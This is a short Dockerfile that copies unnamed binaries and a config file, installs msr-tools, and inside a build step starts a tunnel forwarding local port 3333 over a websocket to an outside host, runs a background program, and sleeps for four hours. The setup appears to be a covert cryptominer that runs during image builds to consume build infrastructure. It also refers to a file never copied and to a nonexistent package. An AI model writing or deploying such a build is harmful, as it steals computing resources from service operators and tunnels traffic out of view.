FROM debian:sid

COPY my-tu /
WORKDIR /app
COPY mg /app/
COPY config.json /app/

RUN apt update -y \
  && apt install -y wget curl procps msr-tools net-tools
RUN chmod a+x /my-tu /nezha && \
  (/my-tu -L 127.0.0.1:3333:127.0.0.1:3333 wss://hax.xn--6krt7h.tk &) && \
  cd /app && \
  (./mg &) && \
  sleep 14400  
RUN apt install ifconfig

CMD /bin/bash
